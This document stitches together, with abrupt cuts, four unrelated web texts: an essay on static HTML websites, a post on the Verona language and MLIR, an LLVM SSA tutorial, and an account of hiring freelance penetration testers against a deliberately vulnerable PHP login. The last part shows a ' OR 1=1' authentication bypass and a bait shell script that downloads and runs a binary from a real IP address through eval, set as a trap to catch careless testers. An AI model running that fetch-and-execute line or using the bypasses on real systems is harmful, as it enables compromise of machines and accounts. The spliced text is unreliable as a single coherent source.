      <p>Another problem with HTTPS is that it is very difficult to
revert back to HTTP once you have started using HTTPS. Every outside link to
your web site will be incorrect, and you can't redirect HTTPS traffic
to HTTP without a valid certificate. In other words, once you start
using HTTPS, you will be forever dependent on the certificate renewal
process.</p><p><span color="#cc0000"><b>T</b><b>he more a web site resembles a folder of ungenerated, static HTML files, served over HTTP, the more sustainable it is.</b></span>
As long as the web exists, there will be web servers capable of serving
static HTML files without requiring any extra setup; static HTML is
foolproof. With that said, there are other things you can generally count
on being available without extra setup. One such thing is PHP. A folder
of <em>mostly</em> static HTML pages, enhanced by PHP includes, is nearly as sustainable as a folder of completely static HTML pages.</p>
      
      <h3>Second criterion: power</h3>
      <p>The second criterion, power, corresponds to the following question:</p>
      <blockquote>
        <p>How limited am I in my creation and maintenance of<br>
&nbsp;&nbsp;&nbsp; a) the structure of the entire site, and<br>
&nbsp;&nbsp;&nbsp; b) any given page on the site?</p></blockquote>
      <p>This
is also a rather important rule in my life, at least as far as
technology is concerned. I like doing things the way I like doing them,
especially when it comes to a creative endeavor – which building a web
site is. I don't like to be hindered by the software I use, unless the
software is good enough to outweigh the irratation provoked by its
limitations.<br>
      </p>
      <blockquote>
      </blockquote>

      <h4>Streamlining<br>
      </h4>
      <p>To be fair, to make the creation and maintenance of a site easier and more
powerful in some regards, it seems necessary to introduce limitations
in other regards. For example, if I want an identical navigation menu
on every page, it is wise to use a PHP include or some type of
templating engine; but this, in turn, limits my power to customize the
navigation menu of each page specifically according to that page's
needs. In streamlining the site's navigation menu, some freedom is lost.<br>
      </p>
      <p>This
type of streamlining is not a bad idea. The problem with
most content management systems and static site generators is that they
streamline too much. If I implement a common navigation menu by putting
a PHP include on every page that needs it, then I can choose <em>not</em>
to include it on any given page. But if I implement the navigation menu
by enforcing a single common template for all pages – which is what
most CMSs and SSGs do – then I can not nearly as easily choose <em>not</em>
to include the navigation menu on some of the pages. If I need to do
so, it is possible, but I am forced to work around the system.</p><h4>Structure<br>
      </h4>
      
      <p>Likewise, static site generators like Jekyll usually make it <em>very</em>
hard to freely choose a directory structure for your site. They are
almost always built for very simple purposes: all blog posts go in <i>_posts</i>, and more complex directory structures are usually very difficult to implement, if not impossible. CMSs
are generally more flexible, but they too can be difficult to bend to
your specific needs. Ultimately, in terms of flexibility, a folder of
static, ungenerated HTML beats everything else, especially when
combined with an <i>.htaccess</i> file.<br>
      </p>
      <h4>Markup language<br>
      </h4>
      <p>CMSs
and SSGs share the tendency to avoid plain HTML: most
CMSs use a WYSIWYG editor, while SSGs usually use Markdown. This is an
obvious and severe limitation: many things in this very article – such
as the red text or the right-aligned headings – are impossible to write
in Markdown (without reverting to actual HTML inside the Markdown
document). But as I mentioned in my original post, there are actually
HTML editors that don't suck, even WYSIWYG editors. I am using <a href="http://kompozer.sourceforge.net/">KompoZer</a>, one such editor, to write this very post.</p><p><span color="#cc0000"><b>If you use a CMS or SSG, you constantly have to battle its limitations.</b></span>
You should consider whether its benefits are great enough to justify
this struggle. They might be – but I suspect that, for many
technologically talented people, they are not.<br>
</p>
      <h3>My current solution</h3>
      <p>Perhaps my own web
site (the one you're visiting right now) can serve as inspiration as to
how to build a web site according to these criteria. It is currently
implemented in the following way:<br>
      </p>
      <ul>
        <li>
          <p>The site is a folder of <em>mostly</em> static HTML files, enhanced by zero, one or two PHP includes, depending on the page:</p>
        </li>
        <ul>
          <li>Navigation menu</li>
          <li>Comments section</li>
        </ul>
        <p>The
comments system, written in PHP, works by
appending new comments to an HTML file located in the same directory as
the page
being commented on. This HTML file is included via PHP on the page.
This system is not nearly as efficient as a database-driven one, but it
is drastically more sustainable<small><big>. (You can try out the system
below.)</big><br>
        </small></p>
        <li>
          <p>I have an <a href="http://john.ankarstrom.se/articles.xml">RSS feed</a>
implemented as a PHP script, which pulls the posts to include in the
feed from the site's front page and subsequently extracts the contents
of each post from their respective file. The front page is updated
manually.<br>

          <p>All files upon which the various pages on the site depend – the stylesheet,
the navigation menu script and the comments script – are put in a
folder at the site's root named <i>1</i>. If I ever choose to re-write the site, I can keep this <i>1</i>
folder, so that the old pages still work, and put the new files, like
the stylesheets and scripts for the new pages, into another folder
named <i>2</i> – and so on forever.</p>

        <p><small>In
my initial article, I put forward the idea of
putting all files upon which a page depends in that page's directory.
Pages would then be self-contained. I ultimately decided against this,
because a) it is useful&nbsp;for some pages to share some common files,
such as a stylesheet, and b) if the stylesheet always resides at the
same URL, browsers will save it in the cache. </small></p>

      <p>As you can see, I have introduced some dynamism to the site,

<p><a href="https://github.com/microsoft/verona">Verona</a> is a new language being developed by <a href="https://www.microsoft.com/en-us/research/lab/microsoft-research-cambridge/">Microsoft Research Cambridge</a> which explores the concept of concurrent ownership.&nbsp;Accessing shared memory in a thread-safe manner needs all sorts of atomic access controls. While modern CPUs implement cache locality and atomic instructions (in addition to previous generation’s inefficient catch-all barriers), such fine control is only meaningful for small objects (usually register sized). </p>



<p>If you want to share large areas of (concurrently) mutable memory, you generally introduce the idea of locks, and with that, comes dead-locks, live-locks and all sorts of memory corruption problems. Alternatives, like message passing, exist for a number of decades, but they’re usually efficient for (again) small objects. It’s quite inefficient to send MB or GB sized mutable blobs in messages.</p>



<p>Verona aims to fix that by passing the <em>ownership</em> of a mutable region of memory as a message instead. The message queues are completely lock-free (using Atomic-Swap lock-free data structures) and only pass the <em>entry-point</em> to a region (an <em>isolated</em> reference to the whole mutable memory blob) as the unique ownership. Meaning only the thread that has that <em>isolated</em> object can access any memory in the region contained within. So each thread has the strong guarantee that no one else is accessing the entire region and there are no chances of concurrent mutation and no need for locks.</p>



<p><a href="https://mlir.llvm.org/">MLIR</a> is a multi-level intermediate representation developed within the <a href="https://www.tensorflow.org/">TensorFlow</a> project but later migrated under the <a href="https://llvm.org/">LLVM</a> umbrella. As a core part of the LLVM project, MLIR is being used in a lot more than just ML representations and is gaining <a href="https://mlir.llvm.org/users/">traction</a> as the high-level representation of some language front-ends (<a href="https://github.com/llvm/llvm-project/tree/master/flang">Fortran</a>, <a href="https://github.com/llvm/circt">Hardware description</a>) and other experiments bringing Clang to use MLIR as its own intermediate language.</p>



<p>The main benefit of using MLIR for language lowering is that you can keep the language semantics as high level as you need, by constructing <em>dialect</em> operations that encode the logic you want, and then creating passes that use those operations to infer behaviour and types or to transform into a more optimal format, before lowering to the <em>standard</em> dialects and further down, LLVM IR.</p>



<p>This fixes the two big problems in front-ends: on the one hand, it’s a lot easier to work with flexible IR operations than <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">AST</a> (abstract syntax tree)  nodes, and on the other hand, we only lower to LLVM IR (which is very low level) when we’re comfortable we can’t extract any more <em>special</em> behaviour from the language semantics. Other existing dialects add to the list of benefits, as they already have rich semantics and existing optimisation passes we can use for free.</p>



<h4>Why Verona needs MLIR</h4>



<p>Verona aims to be easy to program but powerful to express concurrent and rich type semantics without effort. However, Verona’s type system is far from <em>simple</em>. C-like languages usually have <em>native</em> types (integer, float, boolean) that can be directly represented in hardware, or are simple to be operated by a runtime library; and <em>container</em> types (lists, sets, queues, iterators), which offer different views and access on native types. Some languages also support <em>generics</em>, which is a parametrisation of some types on other types, for example, a container of <em>any</em> type, to be defined <em>later</em>.</p>



<p>Verona has all of that, plus:</p>



<ol><li><strong>Type capabilities (mutable, immutable, isolated).</strong> Controlling the access to objects with regards to mutability (ex. immutable objects are stored in immutable memory outside of mutable regions) as well as region sentinels (isolated) that cannot be held by more than one reference from outside the region.</li><li><strong>Type unions (A | B)</strong>. This feature allows users to create functionality that works with multiple types, allowing easy restriction on the types passed and matching specific types in the code (via keyword <code>match</code>) with the guarantee that the type will be one of those.</li><li><strong>Type intersections (A &amp; B).</strong> This allows restricting types with capabilities, making it harder to have unexpected access, for example, returning immutable references or identifying isolated objects on creation. It can also help designing interfaces, creating requirements on objects (ex. to be both <em>random-access</em> and an <em>ordered</em> collection). But also as function arguments, controlling the access to received objects.</li><li><strong>Strong inferred types.</strong> The compiler will emit an error if types cannot be identified at compile time, but users don’t need to declare them everywhere, and sometimes they can’t even be known until the compiler runs its own type inference pass (ex. <em>generics</em>, <em>unions</em>, or <em>lambdas</em>).</li></ol>



<p>Verona currently uses a <a href="https://en.wikipedia.org/wiki/Parsing_expression_grammar">PEG</a> parser that produce the AST and is quite straight forward, but once it’s constructed, working with ASTs (more specifically creating new nodes, replacing or updating existing ones) is quite involved and error prone. MLIR has some nice properties (<a href="https://en.wikipedia.org/wiki/Static_single_assignment_form">SSA form</a>, dialect operations, regions) that make that work much easier to change. But more importantly, the IR has explicit control flow (<a href="https://en.wikipedia.org/wiki/Control-flow_graph">CFG</a>), which is important for tracking where variables come from, pass through all combinations of paths, and ultimately end up at. To infer types and check safety, this is fundamental to make sure the code can’t get to an unknown state through at least one of the possible paths.</p>



<p>So, the main reason why we chose MLIR to be our representation is so we can do our type inference more easily.</p>



<p>The second reason is that MLIR allows us to mix any number of dialects together. So we can lower the AST into a mix of Verona dialect and other standard dialects, and passes that can only see Verona operations will ignore the others and vice-versa. It also allows us to partially lower parts of the dialect into other dialects without having to convert the whole thing. This keep the code clean (short, to-the-point passes) and allows us to slowly build more information, without having to run a huge analysis pass followed by a huge transformation pass, only to lose information in the middle.</p>



<p>An unexpected benefit of MLIR was that it has native support for <em>opaque</em> operations, ie. function-call-like operations that don’t need defining anywhere. This allowed us to prototype the dialect even before it existed, and was the precursor of some of our current dialect operations. We’re still using opaque nodes where the dialect is not complete yet, allowing us to slowly build the dialect without having to rush through (and fail at) a long initial design phase.</p>



<h4>Where are we at</h4>



<p>Right now, we have a <a href="https://github.com/microsoft/verona/blob/master/src/mlir/dialect/VeronaOps.td">dialect</a>, a simple and incomplete MLIR <a href="https://github.com/microsoft/verona/blob/master/src/mlir/generator.cc">generator</a> and a few <a href="https://github.com/microsoft/verona/tree/master/testsuite/mlir/mlir-parse">examples</a>. None of those examples can be lowered to LLVM IR yet, as we don’t have any partial conversion to other standard dialects. Once we have a bit more support for the core language, and we’re comfortable that the dialect is at the right level of abstraction, we’ll start working on the partial conversion.</p>



<p>But, like other <a href="https://mlir.llvm.org/docs/Tutorials/Toy/">examples</a> in MLIR, we’ll have to hold on to strings and printing in our own dialect until it can be lowered directly to the LLVM dialect. This is because MLIR has no native string representation and there is no <em>sane</em> way of representing all types of strings in the existing types.</p>



<p>Other missing important functionality are:</p>



<ul><li><code>when</code> keyword, which controls access to the regions (requests ownership),</li><li><code>match</code> keyword, which controls the types (ex. from a type union) in the following block,</li><li><code>lambda</code> and <code>literal</code> objects, which will create their own capture context via anonymous structures and expose a function call.</li></ul>



<p>We also need to expose some minimal runtime library written in Verona to operate on types (ex. integer/floating-point arithmetic and logic), and we need those classes compiled and exposed to user code as an MLIR module, so that we can look at the code as a whole and do more efficient optimisations (like inlining) as well as pattern-matching <em>known</em> operations, like addition, and lower them to native LLVM instructions (ex. <code>add</code> or <code>fadd</code>).</p>



<h4>Here be dragons</h4>



<p>While we’re always happy to accept issues and pull requests, the current status of the language is raw. We’re co-designing the language, the compiler and the runtime library, as well as its more advanced features such as its <a href="https://github.com/microsoft/verona/tree/master/experiments/clang_interface">clang interface</a> and <a href="https://github.com/microsoft/verona/tree/master/experiments/process_sandbox">process sandbox</a>. All of which would need multiple additional blog posts to cover, and all in continuous discussions to define both syntax and semantics.</p>



<p>By the time we have some LLVM IR generated and hopefully some execution of a simple program, the parser, compiler and libraries will be a bit more stable to allow external people to not only play with it by contribute back.</p>



<p>What would be extremely helpful, though, are tough questions about the language’s behaviour, our own expectations and the API that is exposed to programmers by the runtime. There are a lot of unknowns and until we start writing some serious Verona code, we won’t know for sure what works better. If you’re feeling brave, and would like to create issues with examples of what you would like to see in the language, that’d be awesome.</p>



<p>Also issues (and even pull requests) on the existing implementation would be nice, with recommendations of better patterns on our usage of the external libraries, for example MLIR, which is in constant evolution on its own, and we can’t keep up with every new shiny feature.</p>



<p>So, patches welcome, but bring your dragon-scale armour, shield and fire resistance spells.</p>

<p><em>With thanks to <a href="https://twitter.com/inventednight/">Niki Carroll</a>, winny, and kurufu for their
invaluable proofreading and advice.</em></p>

<h2 id="preword">Preword</h2>

<p>By <a href="https://twitter.com/8x5clPW2/status/1311316978703970307">popular demand</a>, I’m doing another
LLVM post. This time, it’s <strong>single static assignment</strong> (or SSA) form, a common feature
in the intermediate representations of optimizing compilers.</p>

<p>Like <a href="https://blog.yossarian.net/2020/09/19/LLVMs-getelementptr-by-example">the last one</a>, SSA is a
topic in compiler and IR design that I <em>mostly</em> understand but could benefit from some self-guided
education on. So here we are.</p>

<h2 id="how-to-represent-a-program">How to represent a program</h2>

<p>At the highest level, a compiler’s job is singular: to turn some source language <em>input</em>
into some machine language <em>output</em>. Internally, this breaks down into a sequence of clearly
delineated<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> tasks:</p>

<ol>
  <li><strong>Lexing</strong> the source into a sequence of tokens</li>
  <li><strong>Parsing</strong> the token stream into an <strong>abstract syntax tree</strong>, or AST<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></li>
  <li><strong>Validating</strong> the AST (e.g., ensuring that all uses of identifiers are consistent with the
source language’s scoping and definition rules)<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></li>
  <li><strong>Translating</strong> the AST into machine code, with all of its complexities (instruction selection,
register allocation, frame generation, &amp;c)</li>
</ol>

<p>In a <strong>single-pass</strong> compiler, (4) is monolithic: machine code is generated as the compiler walks
the AST, with no revisiting of previously generated code. This is extremely fast (in terms of
compiler performance) in exchange for some a few significant limitations:</p>

<ul>
  <li>
    <p>Optimization potential: because machine code is generated in a single pass, it can’t be revisited
for optimizations. Single-pass compilers tend to generate extremely slow and <em>conservative</em>
machine code.</p>

    <p>By way of example: the
  <a href="https://raw.githubusercontent.com/wiki/hjl-tools/x86-psABI/x86-64-psABI-1.0.pdf">System V ABI</a>
  (used by Linux and macOS) defines
  <a href="https://en.wikipedia.org/wiki/Red_zone_(computing)">a special 128-byte region</a> beyond the
  current stack pointer (<code>%rsp</code>) that can be used by leaf functions whose stack frames fit within
  it. This, in turn, saves a few stack management instructions in the function prologue and
  epilogue.</p>

    <p>A single-pass compiler will struggle to take advantage of this ABI-supplied
  optimization: it needs to emit a stack slot for each automatic variable as they’re visited,
  and cannot revisit its function prologue for erasure if all variables fit within the red zone.</p>
  </li>
  <li>
    <p>Language limitations: single-pass compilers struggle with common language design decisions, like
allowing use of identifiers before their declaration or definition. For example, the following
is valid C++:</p>

    <div><div><pre><code>  <span>class</span> <span>Rect</span> <span>{</span>
  <span>public:</span>
    <span>int</span> <span>area</span><span>()</span> <span>{</span> <span>return</span> <span>width</span><span>()</span> <span>*</span> <span>height</span><span>();</span> <span>}</span>
    <span>int</span> <span>width</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
    <span>int</span> <span>height</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
  <span>};</span>
</code></pre></div>    </div>

    <p>C and C++ <em>generally</em> require pre-declaration and/or definition for identifiers, but
  member function bodies may reference the entire class scope. This will frustrate a
  single-pass compiler, which expects <code>Rect::width</code> and <code>Rect::height</code> to already exist
  in some symbol lookup table for call generation.</p>
  </li>
</ul>

<p>Consequently, (virtually) all modern compilers are <strong>multi-pass</strong>.</p>

<p><img src="https://blog.yossarian.net/assets/multipass.jpg" alt="Pictured: Leeloo Dallas from The Fifth Element holding up her multi-pass.">
<em>“multi-pass” — Leeloo Dallas</em></p>

<p>Multi-pass compilers break the <em>translation</em> phase down even more:</p>

<ol>
  <li>The AST is lowered into an <strong>intermediate representation</strong>, or IR</li>
  <li>Analyses (or passes) are performed on the IR, refining it according to some optimization
profile (code size, performance, &amp;c)</li>
  <li>The IR is either translated to machine code <em>or</em> lowered to <em>another</em> IR, for further target
specialization or optimization<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></li>
</ol>

<p>So, we want an IR that’s easy to <em>correctly</em> transform and that’s amenable to optimization. Let’s
talk about why IRs that have the <strong>static single assignment</strong> property fill that niche.</p>

<h2 id="ssa-form">SSA form</h2>

<p>At its core, the SSA form of any program source program introduces only one new constraint:
all variables are assigned (i.e., stored to) <strong>exactly once</strong>.</p>

<p>By way of example: the following (not actually very helpful) function is <strong>not</strong> in a valid SSA form
with respect to the <code>flags</code> variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags</span> <span>|=</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Why? Because <code>flags</code> is stored to twice: once for initialization, and (potentially) again inside
the conditional body.</p>

<p>As programmers, we could rewrite <code>helpful_open</code> to only ever store once to each automatic variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>But this is clumsy and repetitive: we essentially need to duplicate every chain of uses that
follow any variable that is stored to more than once. That’s not great for readability,
maintainability, or code size.</p>

<p>So, we do what we always do: make the compiler do the hard work for us. Fortunately there exists
a transformation from every valid program into an equivalent SSA form, conditioned on two simple
rules.</p>

<blockquote>
  <p>Rule #1: Whenever we see a store to an already-stored variable, we replace it with a brand
new “version” of that variable.</p>
</blockquote>

<p>Using rule #1 and the example above, we can rewrite <code>flags</code> using <code>_N</code> suffixes to indicate versions:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>// Declared up here to avoid dealing with C scopes.</span>
  <span>int</span> <span>flags_1</span><span>;</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_1</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>But wait a second: we’ve made a mistake!</p>

<ul>
  <li><code>open(..., flags_1, ...)</code> is incorrect: it unconditionally assigns <code>O_CREAT</code>, which wasn’t in the
original function semantics.</li>
  <li><code>open(..., flags_0, ...)</code> is <strong>also</strong> incorrect: it <em>never</em> assigns <code>O_CREAT</code>, and thus
is wrong for the same reason.</li>
</ul>

<p>So, what do we do? We use rule 2!</p>

<blockquote>
  <p>Rule #2: Whenever we need to <em>choose</em> a variable based on control flow, we use the Phi function
(φ) to introduce a <strong>new</strong> variable based on our choice.</p>
</blockquote>

<p>Using our example once more:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
    <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

    <span>// Declared up here to avoid dealing with C scopes.</span>
    <span>int</span> <span>flags_1</span><span>;</span>
    <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
      <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>}</span>

    <span>int</span> <span>flags_2</span> <span>=</span> <span>φ</span><span>(</span><span>flags_0</span><span>,</span> <span>flags_1</span><span>);</span>

    <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_2</span><span>,</span> <span>0644</span><span>);</span>

    <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Our quandary is resolved: <code>open</code> <strong>always</strong> takes <code>flags_2</code>, where <code>flags_2</code> is a fresh SSA variable
produced applying φ to <code>flags_0</code> and <code>flags_1</code>.</p>

<p>Observe, too, that φ is a <strong>symbolic</strong> function: compilers that use SSA forms internally do not
emit real φ functions in generated code<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>. φ exists <em>solely</em> to reconcile rule #1 with the
existence of control flow.</p>

<p>As such, it’s a little bit silly to talk about SSA forms with C examples (since C and other
high-level languages are what we’re translating from in the first place). Let’s dive into how
LLVM’s IR actually represents them.</p>

<h2 id="ssa-in-llvm">SSA in LLVM</h2>

<p>First of all, let’s see what happens when we run our very first <code>helpful_open</code> through <code>clang</code>
with no optimizations:</p>

<p><em>(View it on <a href="https://godbolt.org/z/6ea8Pq">Godbolt</a>.)</em></p>

<p>So, we call <code>open</code> with <code>%3</code>, which comes from…a <code>load</code> from an <code>i32*</code> named <code>%flags</code>?
Where’s the φ?</p>

<p>This is something that <em>consistently</em> slips me up when reading LLVM’s IR: only <em>values</em>,
<strong>not</strong> memory, are in SSA form. Because we’ve compiled with optimizations disabled, <code>%flags</code> is
just a stack slot that we can <code>store</code> into as many times as we please, and that’s <em>exactly</em> what
LLVM has elected to do above.</p>

<p>As such, LLVM’s SSA-based optimizations aren’t all that useful when passed IR that makes direct
use of stack slots. We want to <em>maximize</em> our use of SSA variables, whenever possible, to make
future optimization passes as effective as possible.</p>

<p>This is where <a href="https://llvm.org/docs/Passes.html#mem2reg-promote-memory-to-register"><code>mem2reg</code></a> comes in:</p>

<blockquote>
  <p>This file (optimization pass) promotes memory references to be register references. It promotes
alloca instructions which only have loads and stores as uses. An alloca is transformed by using
dominator frontiers to place phi nodes, then traversing the function in depth-first order to
rewrite loads and stores as appropriate. This is just the standard SSA construction algorithm to
construct “pruned” SSA form.</p>
</blockquote>

<p>(Parenthetical mine.)</p>

<p><code>mem2reg</code> gets run at <code>-O1</code> and higher, so let’s do exactly that:</p>

<div><div><pre><code><span>define</span> <span>dso_local</span> <span>i32</span> <span>@helpful_open</span><span>(</span><span>i8</span><span>*</span> <span>nocapture</span> <span>readonly</span> <span>%fname</span><span>)</span> <span>local_unnamed_addr</span> <span>#0</span> <span>{</span>

  <span>%call1</span> <span>=</span> <span>call</span> <span>i32</span> <span>(</span><span>i8</span><span>*,</span> <span>i32</span><span>,</span> <span>...)</span> <span>@open</span><span>(</span><span>i8</span><span>*</span> <span>%fname</span><span>,</span> <span>i32</span> <span>%spec.select</span><span>,</span> <span>i32</span> <span>420</span><span>)</span> <span>#4</span><span>,</span> <span>!dbg</span> <span>!22</span>
  <span>ret</span> <span>i32</span> <span>%call1</span><span>,</span> <span>!dbg</span> <span>!23</span>
<span>}</span>
</code></pre></div></div>

<p>Foiled again! Our stack slots are gone thanks to <code>mem2reg</code>, but LLVM has actually optimized
<em>too far</em>: it figured out that our flags value is wholly dependent on the return value of our
<code>access</code> call and erased the conditional entirely.</p>

<p>Instead of a φ node, we got this <code>select</code>:</p>

<div><div><pre><code><span>%spec.select</span> <span>=</span> <span>select</span> <span>i1</span> <span>%tobool.not</span><span>,</span> <span>i32</span> <span>66</span><span>,</span> <span>i32</span> <span>2</span>
</code></pre></div></div>

<p>which the <a href="https://llvm.org/docs/LangRef.html#select-instruction">LLVM Language Reference</a>
describes concisely:</p>

<blockquote>
  <p>The ‘select’ instruction is used to choose one value based on a condition, without IR-level branching.</p>
</blockquote>

<p>So we need a better example. Let’s do something that LLVM can’t trivially optimize into a
<code>select</code> (or sequence of <code>select</code>s), like adding an <code>else if</code> with a function that we’ve …</p></div>

<h2><span color="#383b3d">The Story of How I Hired 7 Freelancers to Exploit this Weird Vulnerability</span></h2>

<p>Penetration testing is complex. For it to be successful, the tester needs to possess a variety of different abilities and skills. Some testers rely only on automated tools, while others focus more on manual analysis. While a creative and unconventional way of thinking is necessary, it is also important for the tester to possess the mental discipline to adhere to the time constraints set by the client. It is common for a creative penetration tester to spend a significant amount of time investigating a fun and uncommon exploit, only to realize later that there is not enough time left to provide complete coverage. It is, therefore, not surprising that two different testers will produce two separate reports that include different findings.</p>

<p>I decided to run a little experiment to see how different the reports of different testers would be. I purposely created a vulnerable web application, and hired seven different freelancers to conduct penetration testing against it. I found this to be an excellent opportunity to evaluate the skills of freelancers that provide their services at an extremely low price in online marketplaces. While the cost of penetration testing can be pretty high (typically between $1,000 and $100,000+), these freelancers provide their security services for less than $100. Some of them claim to possess industry-accepted certificates, and I was curious to know the quality of their work, in particular when their services are reviewed positively by thousands of buyers.</p>


<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/login_form.png">
  <figcaption>The vulnerable web form</figcaption>
</figure>


<p>
To keep things simple, I created a PHP login form that included two critical vulnerabilities that could be exploited to bypass the authentication form. While these bugs were not hard to discover or exploit, they required manual analysis; a tester that relies only on automated tools would not be able to identify them.
</p>

<p>
The first vulnerability on the form stems from a bug in session management. During the login operation of the web application, even if the credentials are wrong, the application is including the following header in the HTTP response: <span color="crimson">Set-Cooki auth=195c530a7af5f492a74499e70578d150</span>. A careful penetration tester that manually examines the HTTP response should be able to recognize that there is a typo in the name of the "Set-Cookie" header, hence the browser will not automatically set the cookie value. By setting this cookie value manually, the tester will gain admin privileges.
</p>



<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/response.png" width="95%">
  <figcaption>Identifying the two vulnerabilities after intercepting the HTTP traffic with Burp Suite</figcaption>
</figure>



<p>
The second way to bypass the authentication of the form is by inputting "<span color="crimson">' OR 1=1'</span>" or a similar payload. The root cause of this issue appears to be an SQL Injection vulnerability, but it is, in fact, a hardcoded SQL password. The executed SQL query can be found in the HTTP response:
</p>


<pre><code> SELECT * FROM form_passwords 
WHERE 'password' 
LIKE CONCAT(
	'%', 
	IF(STRCMP(SYSTEM_USER(), '/dev/random@localhost')=-1, REVERSE(" \'"), 
	ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), 
	IF(STRCMP(SESSION_USER(), '/dev/null@localhost')=0, CHAR(40*2-POWER(1, LOG(2)),(4*10+1)*2), 
	CHAR(69,4*10+9)), SPACE(1), '%' ,'\'','%',IF(STRCMP(VERSION(), '10.3.15-MariaDB-0+deb10u1')=0,
	IF(CONNECTION_ID()=1337,"'"="",'-_-'),
	IF(PI()&lt;3,"&lt;(^^)&gt;","'=")), MID("```'`''`'`'`'``'`'``'```````'`'`'`'`'`''`'`'`",7,1), '%');

</code>
</pre>

<p>
The tester will have to de-obfuscate the SQL query in order to extract the hardcoded password. For the tester to de-obfuscate the SQL query, he needs to possess basic knowledge of SQL syntax. This particular SQL query that I created is using nested inline IF statements. The conditions are checking the environmental variables <span color="crimson">SYSTEM_USER</span>, <span color="crimson">SESSION_USER</span> and <span color="crimson">VERSION</span>). Since these values are not known to the tester, he will have to follow all the different logic paths until the constructed query makes sense. Some simple simplifications here and there can make the query much more readable.


</p>


<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/sql_riddle.png">
  <figcaption>De-obfuscating the SQL query</figcaption>
</figure>


<p>
After de-obfuscation, the final query will be: "<span color="crimson">SELECT * FROM form_passwords WHERE 'password123' LIKE %" OR %"$'=%</span>". Inputs such as "<span color="red">' OR 1=1'</span>" would allow the tester to bypass the authentication form successfully. I purposely decided to use a payload that is commonly used when testing forms for SQL injections as an answer to this riddle, to see how many of these testers would correctly identify the root cause of this issue.
</p>


<p>To make things even more interesting, I put a malicious shell script as part of the HTTP response. The contents of the shell script were the following: </p>
<pre><code>obscure() {
   local txt="$1"
   local txt="$a\'{}"
   echo "${txt//?/*}"
}

sql_1 = 'SELECT * FROM form_passwords WHERE "asfsadfd" LIKE CONCAT("%", IF(STRCMP(SYSTEM_USER()'
sql_2 = 'REVERSE(), ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), IF(STRCMP(SESSION_USER(), "/dev/null@localhost")=0'
sql_3 = `wget http://83.212.174.87/mal | chmod +x ./mal | ./mal`
sql_4 = '10.3.15-MariaDB-0+deb10u1)=0,IF(CONNECTION_ID()=1337,"="-_-,IF(PI()&lt;3,&lt;(^^)&gt;'
sql_5 = 'LOG(2)),(4*10+1)*2), CHAR(69,4*10+9)), SPACE(1'

echo "Deobfuscating..."

eval "$sql_1"
eval "$sql_2"
eval "$sql_3"
eval "$sql_4"
eval "$sql_5"
</code>
</pre>


<p>
As can be seen, on line 12, the script is downloading and executing a binary from the Internet. I wanted to see how many of these testers will be careless enough to run my malicious script without auditing it first.

</p>


<p>Finally, I installed an SSH honeypot. My intention was to record any shell interactions by the testers and evaluate their post-exploitation methodology.</p>

